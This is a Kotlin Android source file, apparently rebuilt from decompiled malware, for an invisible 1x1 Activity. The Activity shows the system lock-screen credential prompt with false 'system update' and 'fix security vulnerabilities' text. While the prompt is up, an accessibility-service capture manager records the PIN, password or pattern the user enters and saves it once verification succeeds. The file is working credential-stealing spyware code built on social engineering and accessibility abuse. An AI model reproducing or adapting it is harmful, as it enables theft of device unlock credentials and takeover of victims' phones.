package com.storm.safe.rock.activity

import android.app.Activity
import android.app.KeyguardManager
import android.content.Intent
import android.graphics.Rect
import android.hardware.biometrics.BiometricPrompt
import android.os.Build
import android.os.Bundle
import android.os.CancellationSignal
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager

/**
 * Transparent Activity that triggers biometric/credential verification.
 * Supports BiometricPrompt (API 30+) and KeyguardManager fallback.
 *
 * Reverse-engineered from JADX: activity/syuqattwmgit.java (287 lines).
 * Renamed: f51917a3→Companion, f51918a4→onCredentialVerified, f51919a0→credentialType,
 *          f51920a1→cancellationSignal, f51921a2→hasTriggeredAuth,
 *          m211191a0→onVerificationComplete, m211192a1→getTitleStrings,
 *          m211193a2→showBiometricPrompt, m211194a3→showKeyguardPrompt
 */
class syuqattwmgit : Activity() {

    companion object {
        private const val TAG = "syuqattwmgit"
        private const val KEYGUARD_REQUEST_CODE = 1001

        @Volatile
        @JvmStatic
        var onCredentialVerified: ((Boolean) -> Unit)? = null

        /**
         * Start the credential verification activity.
         * @param credentialType 0 = app verification, 1 = system update
         * @param callback optional callback for verification result
         */
        @JvmStatic
        @JvmOverloads
        fun start(context: android.content.Context, credentialType: Int = 0, callback: ((Boolean) -> Unit)? = null) {
            onCredentialVerified = callback
            val intent = Intent(context, syuqattwmgit::class.java)
            intent.putExtra("credential_type", credentialType)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        }
    }

    var credentialType: Int = 0
    var cancellationSignal: CancellationSignal? = null
    var hasTriggeredAuth: Boolean = false

    /**
     * Handle verification completion.
     */
    fun onVerificationComplete(success: Boolean) {
        Log.v(TAG, "验证完成: ${if (success) "成功" else "失败"}")
        try {
            CipherCaptureManager.instance?.let {
                Log.d("CipherCaptureManager", "🔷 [setPasswordActivityFinished] syuqattwmgit 已结束")
            }
        } catch (e: Exception) {
            Log.w(TAG, "设置密码界面结束标志失败: ${e.message}")
        }

        MyAccessibilityService.Companion.setAssistMode()
        finish()

        try {
            val svc = MyAccessibilityService.Companion.getInstance()
            if (svc != null) {
                val ccm = CipherCaptureManager.instance
                if (ccm != null) {
                    if (success) {
                        Log.d(TAG, "验证成功，confirmAndSaveLastCipher 结果: ${ccm.confirmAndSaveLastCipher()}")
                    } else {
                        // vendor syuqattwmgit.java:108-115 — 条件 discard:
                        //   只在 overlay 存在或有 pattern 数据时 discard，否则保留缓冲密码
                        val pco = com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay.instance
                        val hasOverlay = pco?.captureState == 1 // captureState != 0 means active
                        val hasPatternData = pco?.capturedPoints?.isNotEmpty() == true
                        if (hasOverlay || hasPatternData) {
                            ccm.discardBufferedPassword()
                            Log.w(TAG, "验证失败/取消，丢弃缓冲密码（覆盖层存在或有图案数据）")
                        } else {
                            Log.v(TAG, "验证失败但无覆盖层和图案数据，跳过 discard")
                        }
                    }
                    ccm.stopListening()
                    Log.d(TAG, "已关闭密码捕获监听模式")
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "处理验证结果失败: ${e.message}")
        }

        onCredentialVerified?.invoke(success)
        onCredentialVerified = null
    }

    /**
     * Get localized title strings based on credential type.
     */
    fun getTitleStrings(): Triple<String, String, String> {
        return if (credentialType == 0) {
            Triple(
                "Verify personal identity",
                "Privacy protection",
                "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation."
            )
        } else {
            Triple(
                "Verify lock screen password",
                "Fix system security vulnerabilities",
                "Please enter your lock screen password to complete the system update and fix security vulnerabilities."
            )
        }
    }

    /**
     * Show BiometricPrompt (API 30+).
     */
    fun showBiometricPrompt() {
        if (Build.VERSION.SDK_INT < 30) return
        Log.v(TAG, "使用 BiometricPrompt (API 30+)")
        val (title, subtitle, description) = getTitleStrings()
        Log.v(TAG, "标题: $title, 副标题: $subtitle")
        try {
            val prompt = BiometricPrompt.Builder(this)
                .setTitle(title)
                .setSubtitle(subtitle)
                .setDescription(description)
                .setAllowedAuthenticators(0x8000) // DEVICE_CREDENTIAL
                .build()

            val signal = CancellationSignal()
            cancellationSignal = signal
            signal.setOnCancelListener { /* cancel listener */ }

            MyAccessibilityService.Companion.setVerifyPauseMode()
            sendBroadcast(Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN").setPackage(packageName))
            Log.d(TAG, "已发送 BIOMETRIC_PROMPT_SHOWN 广播")

            prompt.authenticate(signal, mainExecutor, object : BiometricPrompt.AuthenticationCallback() {
                override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
                    Log.v(TAG, "BiometricPrompt 结果: 成功")
                    onVerificationComplete(true)
                }

                override fun onAuthenticationFailed() {
                    Log.v(TAG, "BiometricPrompt 结果: 失败")
                }

                override fun onAuthenticationError(errorCode: Int, errString: CharSequence) {
                    Log.v(TAG, "BiometricPrompt 错误: $errorCode $errString")
                    onVerificationComplete(false)
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "BiometricPrompt 异常: ${e.message}")
            showKeyguardPrompt()
        }
    }

    /**
     * Show KeyguardManager credential prompt (fallback).
     */
    fun showKeyguardPrompt() {
        Log.v(TAG, "使用 KeyguardManager")
        val km = getSystemService("keyguard") as KeyguardManager
        val (title, _, description) = getTitleStrings()
        Log.v(TAG, "标题: $title")
        @Suppress("DEPRECATION")
        val credentialIntent = km.createConfirmDeviceCredentialIntent(title, description)
        if (credentialIntent == null) {
            if (Build.VERSION.SDK_INT >= 30) {
                Log.w(TAG, "KeyguardManager.createConfirmDeviceCredentialIntent 返回 null，回退 BiometricPrompt")
                showBiometricPrompt()
                return
            } else {
                Log.e(TAG, "无法创建验证 Intent")
                onVerificationComplete(false)
                return
            }
        }
        // vendor syuqattwmgit.java:186-188 — SINGLE_TOP + CLEAR_TOP + EXCLUDE_FROM_RECENTS
        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)          // vendor: 536870912
        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)           // vendor: 67108864
        credentialIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS) // vendor: 8388608
        MyAccessibilityService.Companion.setVerifyPauseMode()
        sendBroadcast(Intent("com.storm.safe.rock.BIOMETRIC_PROMPT_SHOWN").setPackage(packageName))
        Log.d(TAG, "已发送 BIOMETRIC_PROMPT_SHOWN 广播 (KeyguardManager)")
        @Suppress("DEPRECATION")
        startActivityForResult(credentialIntent, KEYGUARD_REQUEST_CODE)
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == KEYGUARD_REQUEST_CODE) {
            if (resultCode == RESULT_OK) {
                Log.v(TAG, "KeyguardManager 结果: 成功")
                onVerificationComplete(true)
            } else {
                Log.v(TAG, "KeyguardManager 结果: 失败/取消")
                onVerificationComplete(false)
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.v(TAG, "syuqattwmgit 启动")
        try {
            CipherCaptureManager.instance?.let {
                Log.d("CipherCaptureManager", "🔷 [setPasswordActivityLaunched] syuqattwmgit 已启动")
            }
        } catch (e: Exception) {
            Log.w(TAG, "设置启动保护期失败: ${e.message}")
        }

        // Make activity invisible
        credentialType = intent.getIntExtra("credential_type", 0)
        Log.v(TAG, "验证类型: ${if (credentialType == 0) "应用验证" else "系统更新"}")

        val view = View(this)
        if (Build.VERSION.SDK_INT >= 30) {
            val windowMetrics = window.windowManager.currentWindowMetrics
            val bounds = windowMetrics.bounds
            view.layout(bounds.left, bounds.top, bounds.right, bounds.bottom)
        }
        setContentView(view)

        // Configure transparent window — vendor syuqattwmgit.java:233-247
        val attrs = window.attributes
        attrs.dimAmount = 0.0f
        attrs.x = 0
        attrs.y = 0
        attrs.width = 1
        attrs.height = 1
        // vendor L239: attributes.gravity = 8388661 = Gravity.END | Gravity.TOP
        attrs.gravity = android.view.Gravity.END or android.view.Gravity.TOP
        window.attributes = attrs
        window.decorView.setBackgroundColor(0)
        // vendor L242: setFlags(Segment.SHARE_MINIMUM=1024, 1024) — FLAG_ALT_FOCUSABLE_IM (0x400)
        window.setFlags(0x400, 0x400)
        // vendor L243: addFlags(32) = FLAG_NOT_TOUCH_MODAL
        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL)
        // vendor L244: addFlags(16) = FLAG_NOT_TOUCHABLE
        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
        // vendor L245: addFlags(67108864) = FLAG_TRANSLUCENT_STATUS
        window.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS)
        // vendor L246: addFlags(134217728) = FLAG_TRANSLUCENT_NAVIGATION
        window.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION)
        // vendor L247: addFlags(262144) = FLAG_IGNORE_CHEEK_PRESSES
        window.addFlags(WindowManager.LayoutParams.FLAG_IGNORE_CHEEK_PRESSES)

        Log.v(TAG, "syuqattwmgit onCreate 完成")
    }

    override fun onDestroy() {
        Log.v(TAG, "syuqattwmgit onDestroy")
        super.onDestroy()
        cancellationSignal?.cancel()
        cancellationSignal = null
    }

    override fun onResume() {
        super.onResume()
        Log.v(TAG, "syuqattwmgit onResume, hasTriggeredAuth=$hasTriggeredAuth")
        if (hasTriggeredAuth) return
        hasTriggeredAuth = true
        try {
            val svc = MyAccessibilityService.Companion.getInstance()
            if (svc != null) {
                val ccm = CipherCaptureManager.instance
                ccm?.startListening()
                Log.d(TAG, "已启用密码捕获监听模式")
            }
        } catch (e: Exception) {
            Log.w(TAG, "启用密码捕获失败: ${e.message}")
        }
        // vendor RunnableC0941o6.java:733 (case 24) — isFinishing/isDestroyed guard
        Handler(Looper.getMainLooper()).postDelayed({
            if (isFinishing || isDestroyed) {
                Log.w(TAG, "Activity 已销毁，跳过 BiometricPrompt")
                return@postDelayed
            }
            Log.v(TAG, "API 版本: ${Build.VERSION.SDK_INT}")
            if (Build.VERSION.SDK_INT >= 30) {
                showBiometricPrompt()
            } else {
                showKeyguardPrompt()
            }
        }, 300L)
    }

    override fun onStop() {
        super.onStop()
        Log.v(TAG, "syuqattwmgit onStop (透明Activity被覆盖，这是正常的)")
    }
}
